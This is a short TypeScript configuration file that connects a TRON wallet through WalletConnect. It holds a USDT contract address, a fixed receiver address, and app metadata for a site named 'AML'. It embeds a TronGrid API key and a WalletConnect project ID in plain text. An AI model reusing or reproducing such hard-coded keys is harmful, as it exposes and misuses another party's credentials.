// tronWallet.ts
import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';
import { TronWeb } from 'tronweb';

export const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
export const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n';

export const tronWeb = new TronWeb({
  fullHost: 'https://api.trongrid.io',
  headers: {
    'TRON-PRO-API-KEY': 'bbb42b6b-c4de-464b-971f-dea560319489',
  },
});

export const adapter = new WalletConnectAdapter({
  network: 'Mainnet',
  options: {
    relayUrl: 'wss://relay.walletconnect.com',
    projectId: '6e52e99f199a2bd1feb89b31fbeb6a78',
    metadata: {
      name: 'AML',
      description: 'TRON + WalletConnect Integration',
      url: 'https://amlreports.pro',
      icons: ['https://amlreports.pro/images/icon-3.abdd8ed5.webp'],
    },
  },
  web3ModalConfig: {
    themeMode: 'dark',
  },
});
